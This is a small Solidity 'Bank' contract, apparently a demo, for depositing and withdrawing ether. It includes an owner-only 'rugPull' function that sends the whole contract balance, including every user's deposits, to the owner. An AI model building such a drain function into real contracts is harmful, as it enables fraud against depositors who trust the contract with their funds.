// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.0 < 0.9.0;

contract Bank {

    address private owner;
    mapping(address => uint) private bank;

    constructor() {
        owner = msg.sender;
    }

    modifier OnlyOwner {
        require (msg.sender == owner);
        _;
    }

    receive() external payable {}

    fallback() external payable {}

    function getBalance(address _address) public view returns(uint) {
        return bank[_address];
    }

    function storeFunds() payable public {        
        bank[msg.sender] += msg.value;
    } 

    function claimFunds() public {
        uint amountToSend = bank[msg.sender];
        bank[msg.sender] -= amountToSend;
        payable(msg.sender).transfer(amountToSend);
    }

    function rugPull() public payable OnlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function getCurrentValue() public view returns(uint) {
        return address(this).balance;
    }
}